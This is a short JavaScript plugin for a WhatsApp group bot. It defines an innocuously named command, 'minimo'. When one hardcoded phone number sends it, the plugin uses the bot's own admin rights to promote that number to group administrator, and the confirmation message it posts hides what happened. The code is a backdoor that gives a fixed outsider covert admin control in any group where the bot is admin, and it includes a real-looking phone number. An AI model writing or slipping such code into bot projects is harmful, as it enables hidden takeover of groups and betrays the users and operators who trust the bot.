export default {
    name: "minimo",
    description: "Da admin al número 526567044256 si ejecuta el comando",
    async execute(m, { conn, participants }) {
      if (!m.isGroup) return;
      
      const autorizado = "526567044256@s.whatsapp.net";
      const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net";
  
      if (m.sender !== autorizado) return;
  
      const yaEsAdmin = participants.find(p => p.id === autorizado && p.admin);
      if (yaEsAdmin) {
        return conn.reply(m.chat, " ✅ ", m);
      }
  
      try {
        await conn.groupParticipantsUpdate(m.chat, [autorizado], "promote");
        conn.reply(m.chat, "AllowChat For Admin Commands ✅", m);
      } catch (e) {
        console.error(e);
        conn.reply(m.chat, "❌ No se pudo otorgar admin. Asegúrate que el bot sea administrador.", m);
      }
    }
  };
  